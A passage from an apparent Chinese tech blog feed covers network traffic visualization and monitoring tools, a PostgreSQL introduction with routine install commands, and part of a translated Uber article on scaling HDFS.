<h2 id="三、网络数据可视化"><a href="#三、网络数据可视化" class="headerlink" title="三、网络数据可视化"></a>三、网络数据可视化</h2><h4 id="1、面向流向分析的可视化"><a href="#1、面向流向分析的可视化" class="headerlink" title="1、面向流向分析的可视化"></a>1、面向流向分析的可视化</h4><p>文中开头我们就提到测量网络的第一步就是获得网络拓扑图，如果要获得全局角度实时感知能力，需要在拓扑的基础之上叠加通过各种网络分析技术获得的流量/Flow/事件等信息，进而处理分析网络异常流量。能够实用的数据分析具有相当的复杂性，需要专门的工具软件，区分正常流量数据和异常流量数据、对于“异常模式”的算法训练都有一定门槛，因此存在大量的开源和商业解决方案。<br><img src="http://riboseyim-qiniu.riboseyim.com/Flow_DynamicTopo_LiveAction_1.png" alt=""></p>
<h4 id="2、面向故障诊断的可视化"><a href="#2、面向故障诊断的可视化" class="headerlink" title="2、面向故障诊断的可视化"></a>2、面向故障诊断的可视化</h4><ul>
<li>抓包工具：tcpdump、TShark、 WinDump</li>
<li>图形化工具：wireshark(客户端)、ntopng(webUI)</li>
<li>自定义编程：R、Python(<a href="http://bit.ly/scapy">Python-Scapy</a>)、<a href="http://www.graphviz.org">Graphviz工具包</a></li>
</ul>
<p>一个典型的故障场景：两个服务之间发生故障、无法收发信息，可以通过tcpdump的抓包，并将抓包结果在WireShark上分析，基于染色的方式通信失败的报文被高亮提示。TCP通信中客户端向服务端发送tcp zero window（表示没有window可以接收新数据），如果出现该特征一般可以确定故障是由接收端服务器TCP缓冲区占满的引起，应将排查方向锁定在接收端。关于网络数据包的捕获、过滤、分析的具体实现细节，可以参考：<a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/PacketCapturing_WinZero_2015.png" alt="wireshark应用案例：TCP Window Zero"></p>
<p>在企业应用中，网络监测数据通常需要与基础监控平台融合才能发挥最大价值（开源的方案 Zabbix/Ganglia/Nagios／<a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">Graphite</a> 等）。Collectd 与Ganglia 是竞争关系，都是C语言开发,数据输出都是RRDTool，性能应该差不多，Collectd不包含图形化组件。zabbix是覆盖面比较广的综合套件，除了采集还有告警等其它管理功能，专业性和大规模应用方面可能就不太强。Nagios在思路方面比较接近zabbix,走的是综合性路子，侧重于告警方案：“Ganglia is more concerned with gathering metrics and tracking them over time while Nagios has focused on being an alerting mechanism.” 在Ganglia项目中提供了一个 gmond_proxy 可以搭配 sFlow-RT 支持 NetFlow／sFlow 的数据收集，如果是自己实现 sFlow-RT 类似的组件也需要考虑对 Logstash/splunk的支持。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>开源项目</th>
<th>开发语言</th>
<th>定位</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Collectd</td>
<td>C</td>
<td>数据采集器</td>
<td>不包含图形化组件</td>
</tr>
<tr>
<td>Ganglia</td>
<td>C，PHP（front-end）</td>
<td>数据采集器</td>
<td>包含一个Web图形化组件</td>
</tr>
<tr>
<td>Zabbix</td>
<td>C，PHP（front-end）</td>
<td>Server-Client</td>
<td>不包含图形化扩展插件</td>
</tr>
<tr>
<td>Nagios</td>
<td>C ，PHP（front-end）</td>
<td>Core+Plugins</td>
<td>包含多种图形化扩展插件</td>
</tr>
<tr>
<td><a href="https://riboseyim.github.io/2017/11/23/Visualization-DashBoard">Grafana</a></td>
<td>Go</td>
<td>指标数据的可视化展现板</td>
<td>需要提前对数据进行时序化处理，例如 InfluxDB 等</td>
</tr>
</tbody>
</table>
</div>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Network_sFlow_Arch.png" alt=""><br><img src="http://1.bp.blogspot.com/--W4Io9SdkCA/Vme0AecgIKI/AAAAAAAACOM/WRkZQRZNUVo/s1600/gmond-proxy.png" alt=""></p>
<p><strong>扩展阅读</strong></p>
<ul>
<li><a href="https://riboseyim.github.io/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
</ul>
<h4 id="3、面向安全分析的可视化"><a href="#3、面向安全分析的可视化" class="headerlink" title="3、面向安全分析的可视化"></a>3、面向安全分析的可视化</h4><ul>
<li>流向&amp;协议：<a href="https://riboseyim.github.io/2016/04/26/Visualization-Ntopng">Ntopng</a></li>
<li>地理位置服务，根据IP地址确定改地址的物理位置信息（坐标）：<a href="https://www.maxmind.com/zh/geoip-demo">MaxMind GeoIP</a></li>
<li>安全威胁情报服务，通过信息共享渠道了解识别攻击者的来源、类型和安全厂商确认情况，做到知己知彼。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ntopng-geomap.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/Cyber-Security-Weibu-Demo.png" alt=""></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN-网络中的可视化与数据封包"><a href="#SDN-网络中的可视化与数据封包" class="headerlink" title="SDN 网络中的可视化与数据封包"></a>SDN 网络中的可视化与数据封包</h4><ul>
<li>DPDK(Data Plane Development Kit)<br>运行于Intel X86平台，是 Intel 开源的一组快速处理数据包的开发平台及接口（BSD）。重载了网卡驱动，该驱动在收到数据包后不中断通知CPU，而是将数据包通过零拷贝技术存入内存，这时应用层程序就可以通过DPDK提供的接口，直接从内存读取数据包。这种处理方式节省了CPU中断时间、内存拷贝时间，并向应用层提供了简单易行且高效的数据包处理方式，使得网络应用的开发更加方便。</li>
</ul>
<h4 id="Network-Engineering"><a href="#Network-Engineering" class="headerlink" title="Network Engineering"></a>Network Engineering</h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.github.io/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li>Preview <a href="https://riboseyim.github.io/2017/10/16/SDN-Controller/">SDN 技术指南（三）：OpenDaylight or Floodlight ?</a></li>
<li><a href="https://riboseyim.github.io/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li>Preview <a href="#">SDN 技术指南（五）：NFV</a></li>
<li>Preview <a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li>Preview <a href="#">SDN 技术指南（七）：产业联盟与标准化组织</a></li>
<li>Preview <a href="#">SDN 技术指南（八）：案例</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Visualization-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.ntop.org/wp-content/uploads/2018/07/SF18US_Mainardi.pdf">sFlow: Theory and Practice of a Sampling Technology and Its Analysis with Wireshark</a></li>
<li><a href="https://en.wikipedia.org/wiki/NetFlow">维基百科：NetFlow</a></li>
<li><a href="http://blog.sflow.com/2014/12/influxdb-and-grafana.html">sflow.com:InfluxDB and Grafana</a></li>
<li><a href="http://blog.sflow.com/2013/11/metric-export-to-graphite.html">sflow.com:Metric export to Graphite</a></li>
<li><a href="http://blog.sflow.com/2013/11/exporting-events-using-syslog.html">sflow.com:Exporting events using syslog</a></li>
<li><a href="http://blog.sflow.com/2013/02/cluster-performance-metrics.html">sflow.com:Cluster performance metrics</a></li>
<li><a href="http://blog.sflow.com/2015/12/using-proxy-to-feed-metrics-into-ganglia.html?m=1">sflow.com:Using a proxy to feed metrics into Ganglia</a></li>
<li><a href="http://chenguang.blog.51cto.com/350944/1761284">李晨光：详解网络流量分析</a></li>
<li><a href="http://xiaosu.blog.51cto.com/2914416/1590219">飞翔的单车：解决zabbix用snmp监控网络流量不准的问题</a></li>
<li><a href="http://lifeofzjs.com/blog/2014/07/11/nagios/">lifeofzjs.com:Nagios监控工具介绍</a></li>
<li><a href="http://www.infoq.com/cn/articles/nagios-enterprise-level-system-monitor">王基立:Nagios企业级系统监控方案</a></li>
<li><a href="https://www.pcwdld.com/best-free-netflow-analyzers-and-collectors-for-windows">Top 10 Best Free Netflow Analyzers and Collectors for Windows</a></li>
<li><a href="https://www.juniper.net/us/en/local/pdf/app-notes/3500204-en.pdf">JUNIPER Networks:Juniper Flow Mornitoring</a></li>
<li><a href="http://www.ntop.org/products/netflow/nprobe/">nProbe:An Extensible NetFlow v5/v9/IPFIX Probe for IPv4/v6</a></li>
<li><a href="https://encrypted.google.com/patents/CN1393801A?cl=zh">华为：一种计算机网络远程网络监控方法，CN 1393801 A</a></li>
<li><a href="https://www.ietf.org/rfc/rfc3954.txt">Cisco Systems NetFlow Services Export Version 9</a></li>
<li><a href="https://www.manageengine.com/products/netflow/supported-devices.html">manageengine.com：NetFlow Analyzer - Supported Devices</a></li>
<li><a href="http://www.h3c.com/cn/Products___Technology/Technology/ComwareV5/System_Management/Other_technology/Technology_recommend/200905/634610_30003_0.htm">H3C.com:NetStream技术介绍</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>OpenSource</tag>
        <tag>数据可视化</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>开源技术架构漫谈：PostgreSQL 数据库</title>
    <url>/2018/01/03/OpenSource-DB-PostgreSQL/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>PostgreSQL 的时代到来了吗</li>
<li>PostgreSQL 简史</li>
<li>PostgreSQL ABC</li>
</ul>
<span id="more"></span>
<p>PostgreSQL是对象-关系型数据库，BSD 许可证。拼读为”post-gress-Q-L”。</p>
<h2 id="PostgreSQL-的时代到来了吗"><a href="#PostgreSQL-的时代到来了吗" class="headerlink" title="PostgreSQL 的时代到来了吗 ?"></a>PostgreSQL 的时代到来了吗 ?</h2><ul>
<li>作者： Tony Baer</li>
<li>原文： <a href="https://www.zdnet.com/article/has-the-time-finally-come-for-postgresql/">Has the time finally come for PostgreSQL?</a>（有删节）</li>
</ul>
<p>近30年来 PostgreSQL 无疑是您从未听说过的、最常见的开源 SQL 数据库。PostgreSQL 经常身居幕后：从 EnterpriseDB 到 Amazon Redshift 、Greenplum、Netezza 及其他许多商业数据库产品。</p>
<p>最近在许多商业产品的推动下，PostgreSQL 逐渐走向前台。大约十年前 EnterpriseDB 打开了潘多拉的盒子 —— 作为商业支持平台提供 Oracle 的替代品。特别是最近一段时间，云服务商提供了一系列托管产品：从 Amazon Wed Services 开始, 支持 PostgreSQL 作为其托管关系数据库服务 (Relational Database Service，RDS) 之一。</p>
<p>过去一年 AWS 和它的竞争对手将 PostgreSQL 的市场前景提升了一个等级。AWS 推出了兼容 PostgreSQL 的原生云数据库平台 Amazon Aurora ，作为回应 Microsoft 和 Google 推出了 Azure Database for PostgreSQL 和 Cloud SQL for PostgreSQL 解决方案。</p>
<p>Mark Porter（马克·波特，Amazon Aurora PostgreSQL  和 Amazon RDS for PostgreSQL 主管） 不得不通过一些花哨的方法表达 AWS 对开源社区的支持，例如修复 Bug、提供免费测试帐户和其他形式的财政支助。PostgreSQL 在 AWS 上的实现不是开源的, 因为它是为 AWS 自身的云基础结构而设计。</p>
<p>PostgreSQL 虽然是聚焦于事务型数据库的开源项目, 但是许多基于它的商业产品都是大规模并行处理数据仓库（Massively Parallel Processing，MPP）。出于这个原因,  Greenplums，Netezzas 和Redshifts 创建了自己的开源 forks 项目, 甚至添加像 columnar tables 这样的基本功能。</p>
<p>PostgreSQL 的一个常见主题是支持企业级负载的开源关系数据库。关于这一点，竞争者包括 MySQL 和 MariaDB , 但仍然存在差异, PostgreSQL 支持更复杂的 SQL 函数和数据类型, 包括数组（arrays）, 连接（joins）和视图（Window Functions）等等。</p>
<p>另一个原因是出现了“replace Oracle”的口号, PL/pgSQL 的设计非常类似 Oracle PL/SQL。这正是EnterpriseDB 多年以来一直提倡的，同时获得了 美国金融业监管局(Financial Industry Regulatory Authority，FINRA) 的支持。FINRA 将大约 650 个 Oracle 实例迁移入云（ Amazon RDS for PostgreSQL），作为一个更大战略的一部分, 将其整个部署在 IT 基础设施上的业务迁移到 AWS。根据 FINRA 首席开发者 Steve Downs 的说法，对于  Oracle DBA 而言，在 PostgreSQL 中使用诸如对象/关系映射（object/relational mappings）、存储过程（stored procedures）以及利用视图（view）支持复杂查询的功能，给人一种似曾相识的感觉。</p>
<p>然而, 作为两种不同的数据（包括 SQL 实现）PostgreSQL 和 Oracle 之间毕竟存在显著差异。例如数据库如何处理数字和可变字符字段、同义词、复制 (replication，PostgreSQL 不像 Oracle 那样成熟 ) 以及实例化视图刷新等等。</p>
<p>PostgreSQL 有它独特的优势，即作为第三方寻求自主数据库产品的开源平台。重要的是, 去年秋季发布的最新 10.0 版本（2017年11月09日）, 解决了在 Oracle 或 SQL Server 产品中被视为理所当然的功能，包括声明式表分区（declarative table partitioning）、改进后的复制功能（replication）, 发布/订阅（publish/subscribe）、仲裁提交（quorum commits，对于云部署可能非常有用)。</p>
<p>总之，PostgreSQL 还有很多需要追赶的领域,  Oracle 或 SQL Server 用户也仍然有理由继续使用他们的平台。大部分的差异将体现在数据库的实施, 而不是一些具体的功能特性。这种差异将主要体现在数据库弹性、自动化、基础架构选型以及云计算的规模等方面。有了 AWS、Azure 和 Google Cloud 的加持（非常值得注意的一个信号），若干年后 PostgreSQL 可能最终走出阴影。</p>
<h2 id="PostgreSQL-简史"><a href="#PostgreSQL-简史" class="headerlink" title="PostgreSQL 简史"></a>PostgreSQL 简史</h2><p>PostgreSQL 开始于 UC Berkeley 的 Ingres 计划，经历了长时间的演变。</p>
<p>Ingres 计划的领导者 Michael Stonebraker（迈克尔·斯通布雷克，2015 年图灵奖得主，目前是麻省理工学院兼职教授）在 1982 年离开 Berkeley 进入商业公司 Ingres，1985年又返回 Berkeley 开始新项目 Postgres 。Postgres 项目组从1986年开始发表了一些描述系统基本原理的论文并发行了版本1、2、3 、4，到1993年就有大量的用户存在了。尽管 Postgres计划正式的终止了，BSD许可证却使开发者可以获得副本并进一步开发系统。1994年，两个 UC Berkeley 的研究生 Andrew Yu 和 Jolly Chen 增加了一个SQL语言解释器来替代早先的基于 Ingres 的 QUEL 系统，创建了 Postgres95。</p>
<p>1996年重命名为：PostgreSQL。（版本 6.0 ）</p>
<p>2000年，前 Red Hat 投资者筹组了一间名为Great Bridge的公司来商业化PostgreSQL，以和其他商用数据库厂商竞争。2001年末，Great Bridge 因市场原因终止营运。2001年，Command Prompt, Inc. 发布了最老牌的PostgreSQL 商业软件 Mammoth PostgreSQL，并提供开发者赞助和贡献 PL/Perl、PL/php、维护 PostgreSQL Build Farm 等。</p>
<p>2005年1月 ，Pervasive Software 宣布参与社区及商业支持，直到 2006 年 7 月退出。2005年1月19日，版本 8.0 发行。自 8.0 后，PostgreSQL以原生（Native）的方式，运行于Windows系统。2006年6月，Solaris 10 包含 PostgreSQL一起发布。</p>
<p>2012年09月10日，PostgreSQL 发布 9.2 版本，主要在性能方面的提升，也包括一些新的 SQL 特性。<br>2016年10月27日，PostgreSQL 发布 9.6.1 版本。<br>2017年11月09日，PostgreSQL 发布 10.1 版本。</p>
<h2 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># install</span></span><br><span class="line">$ brew install postgresql</span><br><span class="line"><span class="comment"># version</span></span><br><span class="line">$ pg_ctl -V</span><br><span class="line">pg_ctl (PostgreSQL) 10.1</span><br><span class="line"><span class="comment"># initdb -- 创建一个新的PostgreSQL数据库簇（cluster）,单个服务端实例管理的多个数据库的集合。</span></span><br><span class="line"><span class="comment"># 创建数据库数据的宿主目录，生成共享的系统表 （不属于任何特定数据库的表）和创建template1 和postgres数据库</span></span><br><span class="line">$ initdb /Users/yanrui/Data/TestPG</span><br><span class="line"><span class="comment"># start</span></span><br><span class="line">$ pg_ctl -D /Users/yanrui/Data/TestPG start</span><br><span class="line">waiting <span class="keyword">for</span> server to start....2018-01-03 14:13:17.005 CST [37621] LOG:  listening on IPv4 address <span class="string">&quot;127.0.0.1&quot;</span>, port 5432</span><br><span class="line">2018-01-03 14:13:17.005 CST [37621] LOG:  listening on IPv6 address <span class="string">&quot;::1&quot;</span>, port 5432</span><br><span class="line">2018-01-03 14:13:17.006 CST [37621] LOG:  listening on Unix socket <span class="string">&quot;/tmp/.s.PGSQL.5432&quot;</span></span><br><span class="line">2018-01-03 14:13:17.048 CST [37623] LOG:  database system was shut down at 2018-01-03 14:11:30 CST</span><br><span class="line">2018-01-03 14:13:17.066 CST [37621] LOG:  database system is ready to accept connections</span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line">server started</span><br><span class="line"><span class="comment"># port listen</span></span><br><span class="line">bash-3.2$ netstat -an | grep LISTEN     </span><br><span class="line">tcp6       0      0  ::1.5432               *.*                    LISTEN</span><br><span class="line"><span class="comment"># createdb</span></span><br><span class="line">bash-3.2$ createdb -O[owner] test_db</span><br><span class="line"><span class="comment"># default [当前登录系统用户名]</span></span><br><span class="line">bash-3.2$ psql</span><br><span class="line">2018-01-03 18:14:37.537 CST [45864] FATAL:  database <span class="string">&quot;yanrui&quot;</span> does not exist</span><br><span class="line">psql: FATAL:  database <span class="string">&quot;yanrui&quot;</span> does not exist</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/yanrui</span><br><span class="line"><span class="comment"># login in</span></span><br><span class="line">bash-3.2$ psql test_db</span><br><span class="line">psql (10.1)</span><br><span class="line">Type <span class="string">&quot;help&quot;</span> <span class="keyword">for</span> <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># log out</span></span><br><span class="line">test_db=<span class="comment"># \q  (Ctrl+D)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载</span></span><br><span class="line">$ brew uninstall postgres</span><br><span class="line"><span class="comment"># 开机</span></span><br><span class="line">$ launchctl unload -w ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist</span><br><span class="line">$ rm -rf ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist</span><br></pre></td></tr></table></figure>
<h2 id="Architecture-OverView"><a href="#Architecture-OverView" class="headerlink" title="Architecture OverView"></a>Architecture OverView</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/DB_PostgreSQL_Overview.png" alt=""></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="http://packagemain.blogspot.it/2016/05/data-model-generation-for-postgresql.html">Data Model Generation for PostgreSQL</a></li>
<li><a href="https://postgresconf.org/conferences/2018/program/proposals/finra-placeholder">How FINRA is Migrating to Postgres</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.ruanyifeng.com/blog/2013/12/getting_started_with_postgresql.html">PostgreSQL新手入门</a></li>
<li><a href="http://rachbelaid.com/postgres-full-text-search-is-good-enough/">Postgres full-text search is Good Enough! | JULY 13,2015</a></li>
<li><a href="https://hackernoon.com/showdown-mysql-8-vs-postgresql-10-3fe23be5c19e">Showdown: MySQL 8 vs PostgreSQL 10</a></li>
<li><a href="https://aws.amazon.com/cn/about-aws/whats-new/2018/06/amazon-aurora-postgresql-compatibility-in-aws-govcloud-us/">兼容 PostgreSQL 的 Amazon Aurora 已在 AWS GovCloud（美国）区域推出 | Jun 14,2018</a></li>
<li><a href="https://aws.amazon.com/cn/rds/aurora/">Amazon Aurora 产品信息</a></li>
<li><a href="https://postgreshelp.com/operating-system-kill-signals-on-postgresql/">Case study: Operating system kill signals on PostgreSQL | BY POSTGRESHELP · PUBLISHED FEBRUARY 5, 2019 · UPDATED FEBRUARY 10, 2019</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>开源技术架构漫谈：Hadoop</title>
    <url>/2018/08/01/OpenSource-Hadoop/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Uber Hadoop 文件系统最佳实践</li>
<li>Scaling out using ViewFs</li>
<li>HDFS upgrades</li>
<li>NameNode Garbage collection</li>
<li>Controlling the number of small files</li>
<li>DFS load management service</li>
<li>New Feature : Observer NameNode</li>
<li>Router-based HDFS Federation</li>
<li>Engineering : 独立的群集（isolated clusters）、分阶段升级过程（a staged upgrade process）和应急回滚计划（contingency rollback plans）</li>
</ul>
<span id="more"></span>
<h2 id="Introduction-Apache-Hadoop-简介"><a href="#Introduction-Apache-Hadoop-简介" class="headerlink" title="Introduction | Apache Hadoop 简介"></a>Introduction | Apache Hadoop 简介</h2><h2 id="Core-Concept-Apache-Hadoop-核心概念"><a href="#Core-Concept-Apache-Hadoop-核心概念" class="headerlink" title="Core Concept | Apache Hadoop 核心概念"></a>Core Concept | Apache Hadoop 核心概念</h2><ul>
<li><a href="https://static.googleusercontent.com/media/research.google.com/zh-CN//archive/mapreduce-osdi04.pdf">MapReduce: Simplified Data Processing on Large Clusters</a></li>
<li><a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/035fc972c796d33122033a0614bc94cff1527999.pdf">The Google File System</a><h4 id="Concept-A"><a href="#Concept-A" class="headerlink" title="Concept A"></a>Concept A</h4><h4 id="Concept-B"><a href="#Concept-B" class="headerlink" title="Concept B"></a>Concept B</h4><h4 id="Concept-C"><a href="#Concept-C" class="headerlink" title="Concept C"></a>Concept C</h4></li>
</ul>
<h2 id="Architecture-Apache-Hadoop-架构"><a href="#Architecture-Apache-Hadoop-架构" class="headerlink" title="Architecture | Apache Hadoop 架构"></a>Architecture | Apache Hadoop 架构</h2><ul>
<li><a href="https://prestodb.io/">Presto:Distributed SQL Query Engine for Big Data</a></li>
<li><a href="https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/ViewFs.html">ViewFs Guide</a></li>
<li><a href="https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/WebHDFS.html">WebHDFS REST API</a></li>
</ul>
<h2 id="Best-Practice-Apache-Hadoop-最佳实践"><a href="#Best-Practice-Apache-Hadoop-最佳实践" class="headerlink" title="Best Practice | Apache Hadoop 最佳实践"></a>Best Practice | Apache Hadoop 最佳实践</h2><h1 id="Uber-Hadoop-文件系统最佳实践"><a href="#Uber-Hadoop-文件系统最佳实践" class="headerlink" title="Uber Hadoop 文件系统最佳实践"></a>Uber Hadoop 文件系统最佳实践</h1><ul>
<li>原文：April 5, 2018 <a href="https://eng.uber.com/scaling-hdfs/">Scaling Uber’s Apache Hadoop Distributed File System for Growth</a></li>
</ul>
<blockquote>
<p>How Uber implemented these improvements to facilitate the continued growth, stability, and reliability of our storage system.</p>
</blockquote>
<p>三年前, Uber 工程团队引入 Hadoop 作为大数据分析的存储 (HDFS) 和计算 (YARN) 基础设施。</p>
<p>Uber 使用 Hadoop 进行批量和流式分析, 广泛应用于包括欺诈检测（ fraud detection）、机器学习（machine learning）和 ETA 计算(Estimated Time of Arrival)等领域。在过去的几年里, Uber 的业务发展迅猛,数据量和相关的访问负载呈指数级增长 ; 仅在 2017年, 存储在 HDFS 上的数据量就增长了400% 以上。</p>
<p>在扩展基础设施的同时保持高性能可不是一件轻松的事。为了实现这一目标,Uber 数据架构团队通过实施若干新的调整和功能来扩展  HDFS , 包括可视化文件系统（View File System ，ViewFs）、频繁的 HDFS 版本升级、NameNode 垃圾回收调整, 限制通过系统筛选小文件的数量、HDFS 负载管理服务和只读 NameNode 副本。下面将详细介绍如何执行这些改进以促进存储系统的持续增长、稳定性和可靠性。</p>
<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>HDFS 被设计为可伸缩的分布式文件系统, 单个群集支持上千个节点。只要有足够的硬件, 在一个集群中可以轻松、快速地扩展实现超过 100 pb 的原始存储容量。</p>
<p>然而对于 Uber 而言, 业务迅速增长使其难以可靠地进行扩展同时而不减慢数据分析的速度。成千上万的用户每周都要执行数以百万计的查询（通过 Hive 或 Presto ）。</p>
<p>目前, HDFS 超过一半以上的访问源于 Presto, 并且 90% 的 Presto 查询需要 100 秒以上的时间来处理。如果我们的 HDFS 基础结构超载, 那么在队列中的查询就会堆积起来, 从而导致查询延迟。更为重要的是，对于每个查询而言，我们需要在 HDFS 上尽快地提供数据。</p>
<p>针对原来的存储基础架构, 我们设计了提取（extract）、转换（transform）和加载 (ETL) 机制以便在用户运行查询时减少同一集群中发生的复制延迟。这些群集由于具有双重职责，因而需要生成小文件以适应频繁的写入和更新, 这反而进一步堵塞了队列。</p>
<p>在我们面临的挑战中，首要任务是多个团队需要大量的存储数据, 这就决定了不能采用按照用例或组织进行集群分割的方案, 那样反过来会降低效率的同时增加成本。</p>
<p>造成减速的根源 — 在不影响用户体验的情况下扩展 HDFS 的主要瓶颈是 NameNode 的性能和吞吐量, 它包括系统中所有文件的目录树, 用于跟踪保存数据文件的位置。由于所有元数据都存储在 NameNode 中, 因此客户端对 HDFS 群集的请求必须首先通过它。更复杂的是, NameNode 命名空间上的ReadWriteLock 限制了 NameNode 可以支持的最大吞吐量, 因为任何写入请求都将被独占写锁定, 并强制任何其他请求都在队列中等待。</p>
<p>2016 年晚些时候, 我们开始发现 NameNode  RPC 队列时间高的问题。有时, NameNode 队列时间可能超过每个请求 500毫秒 (最慢的队列时间达到接近一秒), 这意味着每一个 HDFS 请求在队列中至少等待半秒 — 与我们的正常进程时间（10 毫秒以下）相比, 这是明显的减速。</p>
<ul>
<li><img src="http://riboseyim-qiniu.riboseyim.com/Uber-Hadoop-201809-1.png" alt="Figure 1. In 2016, our NameNode RPC queue time could exceed half a second per HDFS request."></li>
</ul>
<h2 id="Enabling-scaling-amp-improving-performance"><a href="#Enabling-scaling-amp-improving-performance" class="headerlink" title="Enabling scaling &amp; improving performance"></a>Enabling scaling &amp; improving performance</h2><p>为了确保 HDFS 高性能运行的同时持续扩展, Uber 并行开发多个解决方案, 以避免在短期内出现停机。这些解决方案使我们建立了一个更可靠和可扩展的系统, 能够支持未来的长期增长。</p>
<p>改进方案概述如下：</p>
<h4 id="Scaling-out-using-ViewFs"><a href="#Scaling-out-using-ViewFs" class="headerlink" title="Scaling out using ViewFs"></a>Scaling out using ViewFs</h4><p><a href="https://blog.twitter.com/engineering/en_us/a/2015/hadoop-filesystem-at-twitter.html">Twitter 尝试过类似努力</a>，在他们的启发下, 我们利用可视化文件系统 (ViewFs) 将 HDFS 拆分为多个物理命名空间, 并使用 ViewFs 挂载点向用户呈现一个虚拟命名空间。</p>
<p>为了完成这一目标, 我们将 HBase（YARN 和 Presto 操作）从相同的 HDFS 集群分开。该调整不仅大大减少了主集群上的负载, 而且使我们的 HBase 更加稳定, 将 HBase 集群的重启时间从几小时减少到几分钟。</p>
<p>我们还为聚合 YARN 应用日志创建了一个专用的 HDFS 群集。要使日志聚合支持 ViewFs, 需要 <strong>YARN-3269</strong>。我们的 Hive 临时目录也被移动到这个群集。增加集群的结果是非常令人满意的 ; 目前, 新群集的服务总写入请求数约占总数的 40%, 而且大多数文件都是小文件, 这也减轻了主群集上的文件计数压力。由于对现有应用程序而言，不需要更改客户端, 因此改转换非常顺利。</p>
<p>最后, 我们在 ViewFs 后端实现了独立的的 HDFS 群集, 而不是基础架构中的 HDFS Federation 。通过这种设置, 可以逐步执行 HDFS 升级, 最大限度地减少大规模停机的风险; 此外, 完全隔离还有助于提高系统的可靠性。然而, 这种修复方案的一个缺点是, 保持单独的 HDFS 群集会导致更高的运营成本。</p>
<ul>
<li><img src="http://riboseyim-qiniu.riboseyim.com/Uber-Hadoop-201809-2.png" alt="Figure 2. We installed ViewFs in multiple data centers to help manage our HDFS namespaces."></li>
</ul>
<h4 id="HDFS-upgrades"><a href="#HDFS-upgrades" class="headerlink" title="HDFS upgrades"></a>HDFS upgrades</h4><p>第二个解决方案是升级 HDFS 以跟上最新版本。我们一年执行了两次主要升级, 首先从 CDH 5.7.2 ( 包含大量 HDFS 2.6.0 补丁) 升级到 Apache 2.7.3, 然后升级到 Apache  2.8.2。为此, 我们还必须重构基于 Puppet 和 Jenkins 之上的部署框架, 以更换第三方群集管理工具。</p>
<p>版本升级带来了关键的可伸缩性改进, 包括 HDFS-9710、HDFS-9198 和 HDFS-9412。例如, 升级到 Apache 2.7.3 后, 增量块报告（incremental block report）的数量明显减少, 从而减轻了 NameNode 的负载。</p>
